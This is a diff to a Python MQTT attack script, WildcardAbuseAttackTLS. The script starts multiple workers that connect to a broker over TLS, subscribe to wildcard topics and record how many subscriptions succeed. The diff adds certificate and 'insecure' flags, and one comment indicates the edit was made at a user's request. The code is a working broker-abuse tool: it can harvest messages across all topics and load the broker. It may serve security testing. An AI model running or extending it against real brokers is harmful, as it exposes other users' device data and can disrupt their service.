@@ -12,6 +12,7 @@ from datetime import datetime
 class WildcardAbuseAttackTLS:
     def __init__(self, broker_host="localhost", broker_port=8883,
                  ca_certs=None, client_cert=None, client_key=None, insecure=False):
+        # <-- Added ca_certs, client_cert, client_key, insecure parameters
         self.broker_host = broker_host
         self.broker_port = broker_port
         self.ca_certs = ca_certs
@@ -31,6 +32,7 @@ class WildcardAbuseAttackTLS:
         }
 
     def _print_cert_status(self):
+        # New helper to show TLS config diagnostics
         if self.ca_certs:
             print(f"  Using CA file: {self.ca_certs} -> {'FOUND' if os.path.exists(self.ca_certs) else 'MISSING'}")
         else:
@@ -44,6 +46,7 @@ class WildcardAbuseAttackTLS:
         try:
             client = mqtt.Client(client_id=client_id)
 
+            # If an explicit CA file is provided and exists, use it (recommended)
             if self.ca_certs and os.path.exists(self.ca_certs):
                 client.tls_set(ca_certs=self.ca_certs,
                                certfile=self.client_cert if (self.client_cert and os.path.exists(self.client_cert)) else None,
@@ -52,6 +55,7 @@ class WildcardAbuseAttackTLS:
                                tls_version=ssl.PROTOCOL_TLS_CLIENT,
                                ciphers=None)
             else:
+                # Use default system trust store or custom context
                 ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                 if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
                     try:
@@ -64,6 +68,7 @@ class WildcardAbuseAttackTLS:
                 client.tls_set_context(ctx)
 
             if self.insecure:
+                # tell paho to skip cert/host verification (testing only)
                 try:
                     client.tls_insecure_set(True)
                 except Exception:
@@ -79,7 +84,7 @@ class WildcardAbuseAttackTLS:
 
     def wildcard_worker(self, worker_id, wildcard_topics, duration_seconds=60, username=None, password=None):
 
-        client_id = f"abuse_attack111"
+        client_id = f"wildciard_abuser_tls_{worker_id}"
         client = self.create_client(client_id, username, password)
 
         if not client:
@@ -94,10 +99,12 @@ class WildcardAbuseAttackTLS:
                         result = client_obj.subscribe(topic, qos=1)
                         self.attack_stats["subscriptions_attempted"] += 1
 
+                        # paho returns (result, mid) for subscribe; result==0 usually means success
                         if isinstance(result, tuple) and result[0] == 0:
                             self.attack_stats["subscriptions_successful"] += 1
                             print(f" Worker {worker_id}: Subscribed to {topic} (TLS)")
                         else:
+                            # fallback checks
                             if result == 0:
                                 self.attack_stats["subscriptions_successful"] += 1
                                 print(f" Worker {worker_id}: Subscribed to {topic} (TLS)")
@@ -138,6 +145,7 @@ class WildcardAbuseAttackTLS:
             client.connect(self.broker_host, self.broker_port, 60)
             client.loop_start()
 
+            # Run for the specified duration
             time.sleep(duration_seconds)
 
             print(f" Worker {worker_id}: Completed wildcard abuse attack")
@@ -170,6 +178,7 @@ class WildcardAbuseAttackTLS:
         print(f"   Duration: {duration_seconds} seconds")
         print(f"   Wildcard topics: {len(wildcard_topics)}")
         print(f"   Broker: {self.broker_host}:{self.broker_port}")
+        # <-- new: show cert/CA status before attack starts
         self._print_cert_status()
         print("=" * 60)
 
@@ -226,6 +235,7 @@ def main():
     parser.add_argument("--username", help="MQTT username for authentication")
     parser.add_argument("--password", help="MQTT password for authentication")
 
+    # <-- Added CLI flags for TLS/CA (the --ca augment you asked for)
     parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
     parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
     parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
@@ -236,10 +246,10 @@ def main():
     attack = WildcardAbuseAttackTLS(
         broker_host=args.broker,
         broker_port=args.port,
-        ca_certs=args.ca,            
-        client_cert=args.client_cert,
-        client_key=args.client_key,  
-        insecure=args.insecure       
+        ca_certs=args.ca,                # <-- wired in
+        client_cert=args.client_cert,    # <-- wired in
+        client_key=args.client_key,      # <-- wired in
+        insecure=args.insecure           # <-- wired in
     )
 
     attack.launch_attack(
